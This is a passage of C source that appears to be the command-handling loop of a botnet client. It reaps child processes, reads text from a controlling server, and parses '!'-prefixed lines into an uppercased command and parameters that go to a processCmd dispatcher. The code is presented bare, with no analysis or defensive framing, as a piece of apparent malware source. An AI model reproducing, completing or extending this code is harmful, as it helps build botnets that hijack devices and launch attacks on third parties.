			for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
				unsigned int *newpids, on;
				for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
				pids[on - 1] = 0;
				numpids--;
				newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
				for (on = 0; on < numpids; on++) newpids[on] = pids[on];
				free(pids);
				pids = newpids;
			}

			commBuf[got] = 0x00;

			trim(commBuf);
			
			unsigned char *message = commBuf;

			if(*message == '!')
			{
				unsigned char *nickMask = message + 1;
				while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
				if(*nickMask == 0x00) continue;
				*(nickMask) = 0x00;
				nickMask = message + 1;

				message = message + strlen(nickMask) + 2;
				while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

				unsigned char *command = message;
				while(*message != ' ' && *message != 0x00) message++;
				*message = 0x00;
				message++;

				unsigned char *tmpcommand = command;
				while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

				unsigned char *params[10];
				int paramsCount = 1;
				unsigned char *pch = strtok(message, " ");
				params[0] = command;

				while(pch)
				{
					if(*pch != '\n')
					{
						params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
						memset(params[paramsCount], 0, strlen(pch) + 1);
						strcpy(params[paramsCount], pch);
						paramsCount++;
					}
					pch = strtok(NULL, " ");
				}

				processCmd(paramsCount, params);

				if(paramsCount > 1)
				{
					int q = 1;
					for(q = 1; q < paramsCount; q++)
					{
						free(params[q]);
					}
				}
			}
		}
	}

	return 0;
}